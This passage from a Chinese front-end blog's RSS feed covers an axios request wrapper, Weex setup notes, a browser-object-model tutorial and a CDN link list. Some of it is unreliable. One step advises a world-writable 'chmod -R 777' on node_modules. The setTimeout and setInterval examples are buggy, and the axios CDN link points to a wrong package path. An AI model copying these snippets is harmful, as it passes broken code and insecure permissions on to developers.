  <span>}</span>
<span>)</span><span>;</span>

<span>export</span> <span>default</span> instance<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>http.js</code> 主要封装 <code>GET</code> 、 <code>POST</code> 、 <code>PATCH</code> 、 <code>DELETE</code> 、 <code>PUT</code> 方法</p>
<div><pre><code><span>import</span> featch <span>from</span> <span>"./featch"</span><span>;</span>
<span>import</span> <span>{</span> omitBy <span>}</span> <span>from</span> <span>"lodash"</span><span>;</span>
<span>import</span> <span>{</span> baseHost <span>}</span> <span>from</span> <span>"@/config"</span><span>;</span>
<span>import</span> axios <span>from</span> <span>"axios"</span><span>;</span>
<span>let</span> serverURL <span>=</span> <span>""</span><span>;</span>
<span>const</span> env <span>=</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span><span>;</span>

<span>const</span> <span>getURL</span> <span>=</span> <span>(</span><span>type</span><span>)</span> <span>=></span> <span>{</span>
  <span>switch</span> <span>(</span>env<span>)</span> <span>{</span>
    <span>case</span> <span>"production"</span><span>:</span>
      serverURL <span>=</span> baseHost<span>[</span>type<span>]</span><span>.</span>pro_host<span>;</span>
      <span>break</span><span>;</span>
    <span>case</span> <span>"development"</span><span>:</span>
      serverURL <span>=</span> baseHost<span>[</span>type<span>]</span><span>.</span>dev_host<span>;</span>
      <span>break</span><span>;</span>
    <span>case</span> <span>"testing"</span><span>:</span>
      serverURL <span>=</span> baseHost<span>.</span>test_host<span>;</span>
      <span>break</span><span>;</span>
  <span>}</span>
  <span>return</span> serverURL<span>;</span>
<span>}</span><span>;</span>

<span>/**
 * <span>@method</span> httpGet
 *
 * import <span>{</span> httpGet <span>}</span> from '@/libraries/axios/http'
 *
 * httpGet('', payload).then().catch()
 *
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>url</span> 请求地址
 * <span>@param</span> <span><span>{</span>Object<span>}</span></span> <span>payload</span> 请求参数
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>type</span> 设置 baseURL
 */</span>

<span>export</span> <span>const</span> httpGet <span>=</span> <span>async</span> <span>(</span>url<span>,</span> payload<span>,</span> type <span>=</span> <span>"API1"</span><span>)</span> <span>=></span> <span>{</span>
  <span>try</span> <span>{</span>
    serverURL <span>=</span> <span>getURL</span><span>(</span>type<span>)</span><span>;</span>
    axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> serverURL<span>;</span>
    <span>const</span> response <span>=</span> <span>await</span> featch<span>.</span><span>get</span><span>(</span><span><span>`</span><span><span>${</span>url<span>}</span></span><span>`</span></span><span>,</span> <span>{</span>
      <span>params</span><span>:</span> payload<span>,</span>
    <span>}</span><span>)</span><span>;</span>

    <span>const</span> result <span>=</span> response<span>.</span>data<span>;</span>
    <span>return</span> result<span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span>err<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>;</span>

<span>/**
 * <span>@method</span> httpPost
 *
 * import <span>{</span> httpPost <span>}</span> from '@/libraries/axios/http'
 *
 * httpPost('', payload).then().catch()
 *
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>url</span> 请求地址
 * <span>@param</span> <span><span>{</span>Object<span>}</span></span> <span>payload</span> 请求参数
 */</span>
<span>export</span> <span>const</span> httpPost <span>=</span> <span>async</span> <span>(</span>url<span>,</span> payload<span>,</span> type <span>=</span> <span>"API1"</span><span>)</span> <span>=></span> <span>{</span>
  <span>try</span> <span>{</span>
    serverURL <span>=</span> <span>getURL</span><span>(</span>type<span>)</span><span>;</span>
    axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> serverURL<span>;</span>
    <span>const</span> response <span>=</span> <span>await</span> featch<span>.</span><span>post</span><span>(</span><span><span>`</span><span><span>${</span>url<span>}</span></span><span>`</span></span><span>,</span> payload<span>)</span><span>;</span>

    <span>const</span> result <span>=</span> response<span>.</span>data<span>;</span>
    <span>return</span> result<span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span>err<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>;</span>

<span>/**
 * <span>@method</span> httpPut
 *
 * import <span>{</span> httpPut <span>}</span> from '@/libraries/axios/http'
 *
 * httpPut('', payload).then().catch()
 *
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>url</span> 请求地址
 * <span>@param</span> <span><span>{</span>Object<span>}</span></span> <span>payload</span> 请求参数
 */</span>
<span>export</span> <span>const</span> httpPut <span>=</span> <span>async</span> <span>(</span>url<span>,</span> payload<span>,</span> type <span>=</span> <span>"API1"</span><span>)</span> <span>=></span> <span>{</span>
  <span>try</span> <span>{</span>
    serverURL <span>=</span> <span>getURL</span><span>(</span>type<span>)</span><span>;</span>
    axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> serverURL<span>;</span>
    <span>const</span> response <span>=</span> <span>await</span> featch<span>.</span><span>put</span><span>(</span><span><span>`</span><span><span>${</span>url<span>}</span></span><span>`</span></span><span>,</span> payload<span>)</span><span>;</span>

    <span>const</span> result <span>=</span> response<span>.</span>data<span>;</span>
    <span>return</span> result<span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span>err<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>;</span>

<span>/**
 * <span>@method</span> httpPatch
 *
 * import <span>{</span> httpPatch <span>}</span> from '@/libraries/axios/http'
 *
 * httpPatch('', payload).then().catch()
 *
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>url</span> 请求地址
 * <span>@param</span> <span><span>{</span>Object<span>}</span></span> <span>payload</span> 请求参数
 */</span>
<span>export</span> <span>const</span> httpPatch <span>=</span> <span>async</span> <span>(</span>url<span>,</span> payload<span>,</span> type <span>=</span> <span>"API1"</span><span>)</span> <span>=></span> <span>{</span>
  <span>try</span> <span>{</span>
    serverURL <span>=</span> <span>getURL</span><span>(</span>type<span>)</span><span>;</span>
    axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> serverURL<span>;</span>
    <span>const</span> response <span>=</span> <span>await</span> featch<span>.</span><span>patch</span><span>(</span><span><span>`</span><span><span>${</span>url<span>}</span></span><span>`</span></span><span>,</span> payload<span>)</span><span>;</span>

    <span>const</span> result <span>=</span> response<span>.</span>data<span>;</span>
    <span>return</span> result<span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span>err<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>;</span>

<span>/**
 * <span>@method</span> httpDelte
 *
 * import <span>{</span> httpDelte <span>}</span> from '@/libraries/axios/http'
 *
 * httpDelte('', payload).then().catch()
 *
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>url</span> 请求地址
 * <span>@param</span> <span><span>{</span>Object<span>}</span></span> <span>payload</span> 请求参数
 */</span>
<span>export</span> <span>const</span> httpDelte <span>=</span> <span>async</span> <span>(</span>url<span>,</span> payload<span>,</span> type <span>=</span> <span>"API1"</span><span>)</span> <span>=></span> <span>{</span>
  <span>try</span> <span>{</span>
    serverURL <span>=</span> <span>getURL</span><span>(</span>type<span>)</span><span>;</span>
    axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> serverURL<span>;</span>
    <span>const</span> response <span>=</span> <span>await</span> featch<span>.</span><span>delete</span><span>(</span><span><span>`</span><span><span>${</span>url<span>}</span></span><span>`</span></span><span>,</span> <span>{</span>
      <span>data</span><span>:</span> payload<span>,</span>
    <span>}</span><span>)</span><span>;</span>

    <span>const</span> result <span>=</span> response<span>.</span>data<span>;</span>
    <span>return</span> result<span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span>err<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="使用案例" tabindex="-1"> 使用案例</h3>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> <span>{</span> httpPost <span>}</span> <span>from</span> <span>"@/libraries/axios/http"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>mounted</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> url <span>=</span> <span>this</span><span>.</span><span>API</span><span>.</span>user<span>.</span>UserLogin<span>;</span>
    <span>const</span> payload <span>=</span> <span>{</span>
      <span>userName</span><span>:</span> <span>"admin"</span><span>,</span>
      <span>userPassword</span><span>:</span> <span>"admin"</span><span>,</span>
    <span>}</span><span>;</span>

    <span>httpPost</span><span>(</span>url<span>,</span> payload<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>res</span><span>)</span> <span>=></span> <span>{</span>
      <span>// 这里的 res 即是后端返回的数据结构</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>weex 初学笔记</title>
      <link>https://vxhly.github.io/views/vuejs/weex-beginner-notes.html</link>
      <guid>https://vxhly.github.io/views/vuejs/weex-beginner-notes.html</guid>
      <source url="https://vxhly.github.io/rss.xml">weex 初学笔记</source>
      <description>前言
Weex 是使用流行的 Web 开发体验来开发高性能原生应用的框架。关于 Weex 的一些基础概念不多阐述, 这篇文章记录的是在开发过程中遇到一些坑以及其解决方案。

</description>
      <category>vuejs</category>
      <pubDate>Tue, 12 May 2020 09:58:29 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Weex 是使用流行的 Web 开发体验来开发高性能原生应用的框架。关于 Weex 的一些基础概念不多阐述, 这篇文章记录的是在开发过程中遇到一些坑以及其解决方案。</p>
</div>

<h2 id="前期环境搭建" tabindex="-1"> 前期环境搭建</h2>
<p><a href="https://weex.apache.org/zh/" target="_blank" rel="noopener noreferrer">Weex 的官方文档</a></p>
<div><p>大坑</p>
<p>前期开发环境搭建这一步很重要, 有可能会失败也有可能会因为网速等问题导致失败, 但是一定要耐心多多尝试, 多尝试之后就会体验到飞起来的感觉</p>
</div>
<div><p>开发系统环境</p>
<p>本篇文章使用到的系统环境 <code>macOS Catalina 10.15.4</code> , 注意这边不推荐 <code>win 7</code> 用户学习 Weex, 可使用 <code>win 8</code> 、 <code>win 10</code></p>
</div>
<h3 id="osx-环境" tabindex="-1"> OSX 环境</h3>
<div><pre><code><span>sudo</span> <span>chmod</span> -R <span>777</span> /usr/local/lib/node_modules/
<span>npm</span> i -g weex-toolkit <span># 安装不要使用sudo执行</span>
weex -v <span># 查看当前weex工具版本</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="windows-环境" tabindex="-1"> Windows 环境</h3>
<div><pre><code><span>npm</span> i -g weex-toolkit
weex -v <span># 查看当前weex工具版本</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="构建-ios-app" tabindex="-1"> 构建 IOS APP</h2>
<p>要想构建 IOS APP, 首先需要 <code>MacOS</code> 的一个系统环境, 构建之前需要进行以下步骤</p>
<div><pre><code>weex platform <span>add</span> ios <span># 添加 IOS 平台的支持</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>接下来这个很关键, 换源（换的是 cocoapods 的安装软件源）, 除非你非常自信自己的网络是可以访问至国外的服务器, 或是已经有了科学上网的本领</p>
<div><pre><code>gem --version <span># 检测机子上是否正确安装了 ruby 环境</span>
<span>sudo</span> gem <span>install</span> cocoapods <span># 需要使用 sudo 的权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>换源 <a href="https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/" target="_blank" rel="noopener noreferrer">清华大学开源软件镜像站</a></p>
<div><pre><code><span>cd</span> ~/.cocoapods/repos
pod repo remove master
<span>git</span> clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master <span># 这一步可能会下载失败啥的, 一定要多试几次并确保下载完整</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>最后进入自己的工程, 在自己工程的 podFile 第一行加上：</p>
<div><pre><code><span>source</span> <span>'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git'</span> <span># 最好是将原第一行内容直接替换成这个</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="debug" tabindex="-1"> Debug</h2>
<p>如果执行 <code>weex debug src</code> 发生类似于以下错误的可以使用 <code>weex doctor</code> 来进行修复你的一些缺失依赖</p>
<div><p>Error</p>
<p>./src/index.vue Module build failed: Error:</p>
<p>Vue packages version mismatch:</p>
<ul>
<li>vue@2.5.21 (/Users/codeman/.wx/modules/node_modules/_vue@2.5.21@vue/dist/vue.runtime.common.js)</li>
<li>vue-template-compiler@2.6.11 (/Users/codeman/.wx/modules/node_modules/_vue-template-compiler@2.6.11@vue-template-compiler/package.json)</li>
</ul>
<p>This may cause things to work incorrectly. Make sure to use the same version for both. If you are using vue-loader@&gt;=10.0, simply update vue-template-compiler. If you are using vue-loader@&lt;10.0 or vueify, re-installing vue-loader/vueify should bump vue-template-compiler to the latest.</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>浏览器对象模型</title>
      <link>https://vxhly.github.io/views/web/browser-object-model.html</link>
      <guid>https://vxhly.github.io/views/web/browser-object-model.html</guid>
      <source url="https://vxhly.github.io/rss.xml">浏览器对象模型</source>
      <description>前言
BOM (Browser Object Model) 是指浏览器对象模型, 是用于描述这种对象与对象之间层次关系的模型。

</description>
      <category>web</category>
      <pubDate>Mon, 15 Aug 2016 21:58:30 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>BOM (Browser Object Model) 是指浏览器对象模型, 是用于描述这种对象与对象之间层次关系的模型。</p>
</div>

<h2 id="bom-的定义" tabindex="-1"> BOM 的定义</h2>
<ul>
<li><code>BOM</code> 是 <code>browser object model</code> 的缩写, 简称浏览器对象模型</li>
<li><code>BOM</code> 提供了独立于内容而与浏览器窗口进行交互的对象</li>
<li>由于 <code>BOM</code> 主要用于管理窗口与窗口之间的通讯, 因此其核心对象是 <code>window</code></li>
<li><code>BOM</code> 由一系列相关的对象构成, 并且每个对象都提供了很多方法与属性</li>
<li><code>BOM</code> 缺乏标准, <code>JavaScript</code> 语法的标准化组织是 <code>ECMA</code> , <code>DOM</code> 的标准化组织是 <code>W3C</code></li>
<li><code>BOM</code> 最初是 <code>Netscape</code> 浏览器标准的一部分</li>
</ul>
<h3 id="bom-的结构图" tabindex="-1"> BOM 的结构图</h3>
<p>在线查看 <a href="/assets/browser-object-model.jpg?attname=">browser-object-model.jpg</a><br> 请下载查看 <a href="/assets/browser-object-model.jpg?attname=">browser-object-model.jpg</a></p>
<h2 id="bom-和-dom-的不同之处" tabindex="-1"> BOM 和 DOM 的不同之处</h2>
<h1 id="" tabindex="-1"> </h1>
<ul>
<li><code>BOM</code> 即浏览器对象模型, 主要用了访问一些和网页无关的浏览器功能。 如: <code>window</code> 、 <code>location</code> 、 <code>navigator</code> 、 <code>screen</code> 、 <code>history</code> 等对象。</li>
<li><code>DOM</code> 即文档对象模型, 针对 <code>HTML</code> （或 <code>XML</code> ）文档的 <code>API</code> （应用程序编程接口）。 描绘的一个层次化的节点树, 开发人员可以添加、 修改和删除页面的某一部分。</li>
</ul>
<h2 id="细说-bom-对象" tabindex="-1"> 细说 BOM 对象</h2>
<h3 id="window-对象" tabindex="-1"> window 对象</h3>
<p>window 对象表示浏览器的一个实例, 同时也是 ECMAScript 规定的 Global 对象。 （Global: 所有在全局作用域中定义的属性和函数, 都是 Global 对象的属性。 在浏览器中 Global 对象实际上就是 window 对象实现的 ） 全局作用域( 所有全局对象都可以通过 window 来访问 )</p>
<p><code>For Example:</code></p>
<div><pre><code><span>var</span> str <span>=</span> <span>"张三"</span><span>;</span>

<span>function</span> <span>fun</span><span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span>str<span>)</span><span>;</span>
<span>}</span>
<span>// 全局对象都可以通过 window 的属性方式来访问</span>
<span>alert</span><span>(</span>window<span>.</span>str<span>)</span><span>;</span>
window<span>.</span><span>fun</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="弹出窗口" tabindex="-1"> 弹出窗口</h4>
<p><code>For Example:</code></p>
<div><pre><code>window<span>.</span><span>open</span><span>(</span><span>"https://www.baidu.com"</span><span>,</span> <span>"NewWin"</span><span>,</span> <span>"height=400, width=400"</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>第三个参数还可能有的值如: <br></p>
<p><img src="/assets/window-object.png" alt="window 对象"></p>
<h4 id="间歇调用-settimeout" tabindex="-1"> 间歇调用（setTimeout）</h4>
<p><code>For Example:</code></p>
<div><pre><code><span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>"Hello world!"</span><span>)</span><span>;</span>
<span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span> <span>// 会在 1000 毫秒后执行</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>如果在间歇时间之前想要取消执行, 我们可以 <code>clearTimeout()</code> , <code>For Example:</code></p>
<div><pre><code><span>// 设置超时调用</span>
<span>var</span> timeoutId <span>=</span> <span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>"Hello world!"</span><span>)</span><span>;</span>
<span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>
<span>//注意:  把它取消</span>
<span>clearTimeout</span><span>(</span>timeoutId<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>同样我们也可以通过间歇调用模拟实现超时调用, <code>For Example:</code></p>
<div><pre><code><span>function</span> <span>fun</span><span>(</span><span>)</span> <span>{</span>
  <span>// 这里可以实现某些逻辑</span>
  <span>setTimeout</span><span>(</span><span>fun</span><span>(</span><span>)</span><span>,</span> <span>100</span><span>)</span><span>;</span>
<span>}</span>
<span>fun</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="超时调用-setinterval" tabindex="-1"> 超时调用（setInterval）</h4>
<p><code>For Example:</code></p>
<div><pre><code><span>setInterval</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>"Hello world!"</span><span>)</span><span>;</span>
<span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span> <span>// 每隔 1 秒 执行一遍</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>如果想要取消执行, 我们可以 <code>clearTimeout()</code> , <code>For Example:</code></p>
<div><pre><code><span>var</span> i <span>=</span> <span>1</span><span>;</span>
<span>var</span> timeId <span>=</span> <span>setInterval</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  i<span>++</span><span>;</span>
  <span>// 这里可以执行某些逻辑</span>
  <span>if</span> <span>(</span><span>1</span> <span>>=</span> <span>100</span><span>)</span> <span>{</span>
    <span>clearInterval</span><span>(</span>timeId<span>)</span><span>;</span> <span>// 注意和取消间歇调用不一样（clearTimeout）</span>
  <span>}</span>
<span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span> <span>// 每隔1秒 执行一遍</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="location-对象" tabindex="-1"> location 对象</h3>
<p>location 对象说来也是奇怪, 它既是 window 的属性也是 document 属性, 且同时指向了同一个对象。 window 和 document 的关系: 浏览器中的 html 成为了 document 对象, 使我们可以通过 javascript 来访问、 操作 html 的元素。 且 documnet 对象是 window 对象的一部分, 可以通过 window.document 属性来访问。</p>
<h4 id="location-的属性" tabindex="-1"> location 的属性</h4>
<table>
<thead>
<tr>
<th>属性名</th>
<th>例子</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>hash</td>
<td>&quot;#contens&quot;</td>
<td>返回 URL 中 hash（#号后跟零或多个字符）, 如果 URL 中不包含散列, 则返回空字符串</td>
</tr>
<tr>
<td>host</td>
<td>&quot;www.baidu.com:80&quot;</td>
<td>返回服务器名和端口号</td>
</tr>
<tr>
<td>hostname</td>
<td>&quot;www.baidu.com&quot;</td>
<td>返回不带端口号的服务器名称</td>
</tr>
<tr>
<td>href</td>
<td>&quot;<a href="http://www.baidu.com" target="_blank" rel="noopener noreferrer">http://www.baidu.com</a>&quot;</td>
<td>返回当前加载页面的完整 URL。 location 对象的 toString() 方法也返回该值</td>
</tr>
<tr>
<td>pathname</td>
<td>&quot;/admin/&quot;</td>
<td>返回 URL 中的目录或文件名</td>
</tr>
<tr>
<td>port</td>
<td>&quot;8080&quot;</td>
<td>返回 URL 中指定的端口号, 如果 URL 中不包含端口号, 则返回空字符串</td>
</tr>
<tr>
<td>protocol</td>
<td>&quot;http:&quot;</td>
<td>返回页面使用的协议。 通常是 http: 或者是 https:</td>
</tr>
<tr>
<td>search</td>
<td>&quot;?q=javascript&amp;&amp;tags=web&quot;</td>
<td>返回 URL 中查询的字符串。 查询以 ？ 与前面的字符串分割, 用 &amp;&amp; 连接多个类型的查询</td>
</tr>
</tbody>
</table>
<p>有了上面这些属性, 我们可以非常方便的修改 <code>url</code> , <code>For Example:</code></p>
<div><pre><code><span>// 假设初始 URL 为 http://www.wrox.com/WileyCDA/</span>
<span>// 将 URL 修改为 "http://www.wrox.com/WileyCDA/#section1"</span>
location<span>.</span>hash <span>=</span> <span>"#section1"</span><span>;</span>
<span>// 将 URL 修改为 "http://www.wrox.com/WileyCDA/?q=javascript"</span>
location<span>.</span>search <span>=</span> <span>"?q=javascript"</span><span>;</span>
<span>// 将 URL 修改为 "https://www.yahoo.com/WileyCDA/"</span>
location<span>.</span>hostname <span>=</span> <span>"www.yahoo.com"</span><span>;</span>
<span>// 将 URL 修改为 "https://www.yahoo.com/mydir/"</span>
location<span>.</span>pathname <span>=</span> <span>"mydir"</span><span>;</span>
<span>// 将 URL 修改为 "https://www.yahoo.com:8080/WileyCDA/"</span>
location<span>.</span>port <span>=</span> <span>8080</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>每次修改 <code>location</code> 的属性（ <code>hash</code> 除外）, 页面都会以新 URL 重新加载。 也就是说, 浏览器会生成一天后退的历史记录。 如果我们不想能够回退可以使用 <code>replace（）</code> 方法, <code>For Example:</code></p>
<div><pre><code>location<span>.</span><span>replace</span><span>(</span><span>"https://www.baidu.com"</span><span>)</span><span>;</span> <span>// 如此就不会有回退记录了。</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>除了 <code>replace</code> 方法外还有个比较重要的方法。 <code>reload</code> 方法用来刷新。</p>
<div><pre><code>location<span>.</span><span>reload</span><span>(</span><span>)</span><span>;</span> <span>// 重新加载（有可能从缓存中加载）</span>
location<span>.</span><span>reload</span><span>(</span><span>true</span><span>)</span><span>;</span> <span>// 重新加载（从服务器重新加载）也就是强制刷新</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="navigator-对象、-screen-对象" tabindex="-1"> navigator 对象、 screen 对象</h3>
<p>navigator 对象主要用来识别客户端浏览器, 但是由于各类浏览器对 navigator 对象的实现各有不同, 这里就不细分析了。 screen 对象基本上只用来表明客户端的能力, 其中包括浏览器窗口外部的显示器的信息, 如像素宽度和高度等。 每种浏览器对其的支持程度也是不同的, 这里也不分析了。</p>
<h3 id="history-对象" tabindex="-1"> history 对象</h3>
<p>history 对象主要保存当前也网页的历史记录。 但出于安全考虑, 程序员不能够知道详细的 url。</p>
<p><code>For Example:</code></p>
<div><pre><code>history<span>.</span>length<span>;</span> <span>// 历史记录的数量</span>
history<span>.</span><span>back</span><span>(</span><span>)</span><span>;</span> <span>// 后退一页</span>
history<span>.</span><span>forward</span><span>(</span><span>)</span><span>;</span> <span>// 前进一页</span>
history<span>.</span><span>go</span><span>(</span><span>-</span><span>1</span><span>)</span><span>;</span> <span>// 后退一页</span>
history<span>.</span><span>go</span><span>(</span><span>1</span><span>)</span><span>;</span> <span>// 前进一页</span>
history<span>.</span><span>go</span><span>(</span><span>2</span><span>)</span><span>;</span> <span>// 前进两页</span>
history<span>.</span><span>go</span><span>(</span><span>"wrox.com"</span><span>)</span><span>;</span> <span>// 跳转到最近的 wrox.com 页面</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/window-object.png" type="image/png"/>
    </item>
    <item>
      <title>JavaScript、CSS 的 CDN 地址</title>
      <link>https://vxhly.github.io/views/web/cdn-by-javascript-and-css.html</link>
      <guid>https://vxhly.github.io/views/web/cdn-by-javascript-and-css.html</guid>
      <source url="https://vxhly.github.io/rss.xml">JavaScript、CSS 的 CDN 地址</source>
      <description>前言
收集常用的 JavaScript 库或者 CSS 库的 CDN 地址, 并且提供 JavaScript 在 window 对象中的全局名字。

</description>
      <category>web</category>
      <pubDate>Mon, 14 Sep 2020 09:14:10 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>收集常用的 JavaScript 库或者 CSS 库的 CDN 地址, 并且提供 JavaScript 在 window 对象中的全局名字。</p>
</div>

<h2 id="vue-2-6-10" tabindex="-1"> vue@2.6.10</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>Vue</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="axios-0-19-0" tabindex="-1"> axios@0.19.0</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>axios</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/vue@0.19.0/dist/vue.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="vue-i18n-8-15-1" tabindex="-1"> vue-i18n@8.15.1</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>VueI18n</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/vue-i18n@8.15.1/dist/vue-i18n.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="vue-router-3-1-3" tabindex="-1"> vue-router@3.1.3</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>VueRouter</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/vue-router@3.1.3/dist/vue-router.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="vuex-3-1-3" tabindex="-1"> vuex@3.1.3</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>Vuex</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/vuex@3.1.3/dist/vuex.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="ant-design-vue-1-6-5" tabindex="-1"> ant-design-vue@1.6.5</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>antd</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/ant-design-vue@1.6.5/dist/antd.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><div><pre><code>https://cdn.jsdelivr.net/npm/ant-design-vue@1.6.5/dist/antd.min.css
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="element-ui-2-13-2" tabindex="-1"> element-ui@2.13.2</h2>
<div><p>全局名字</p>
